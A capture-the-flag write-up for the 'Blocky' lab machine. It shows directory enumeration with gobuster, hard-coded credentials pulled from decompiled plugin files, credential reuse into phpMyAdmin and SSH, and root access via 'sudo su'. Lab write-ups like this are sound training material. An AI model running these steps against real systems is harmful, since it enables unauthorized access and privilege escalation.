We see there is a wordpress page running on port 80

<img src="/assets/img/writeups/blocky_wordpress.png" alt="wordpress" style="zoom: 50%;" />



Running 

```sh
gobuster dir -w <wordlist> -x .php,.txt -o <outputfile> -u http://10.10.10.37
```

with the appropriate wordlist yielded the following results

```sh
/index.php (Status: 301)
/wiki (Status: 301)
/wp-content (Status: 301)
/wp-login.php (Status: 200)
/plugins (Status: 301)
/license.txt (Status: 200)
/wp-includes (Status: 301)
/javascript (Status: 301)
/wp-trackback.php (Status: 200)
/wp-admin (Status: 301)
/phpmyadmin (Status: 301)
/wp-signup.php (Status: 302)
/server-status (Status: 403)
```

We see several interesting possibilities for further enumeration and exploit paths, what we need  however is in /plugins

![plugins](/assets/img/writeups/blocky_plugins.png)

downloading both these files and looking at them with **jd-gui** shows us the following

![blockycore](/assets/img/writeups/blocky_blockycore.png)

This login and password will get us into the phpmyadmin portal, where we can look at the mySQL wordpress users table and find there is a user named **notch**, or more simply we can direct our browser to http://10.10.10.37/?author=1 and get the user name there.

This user and pass gives us login to FTP and SSH. We obviously login to SSH. We can then read the user.txt file.

Gaining root is as simple as running "sudo -l" and seeing the notch can run everything as root, and then switching to root, which we can do as we have notch's password

```
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ sudo su
root@Blocky:/home/notch# whoami
root
root@Blocky:/home/notch# 

```

which gives us access to the root.txt flag.
